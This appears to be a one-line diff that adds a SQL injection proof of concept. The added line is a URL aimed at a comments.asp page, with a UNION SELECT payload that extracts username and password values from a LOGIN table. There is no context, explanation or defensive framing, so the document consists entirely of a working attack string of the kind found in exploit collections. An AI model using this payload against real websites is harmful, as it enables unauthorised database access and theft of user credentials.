@@ -1,0 +1,1 @@
+http://www.example.com/path/comments.asp?id=-1 UNION SELECT 0,username,password,3,4+FROM+LOGIN+WHERE+ID=1
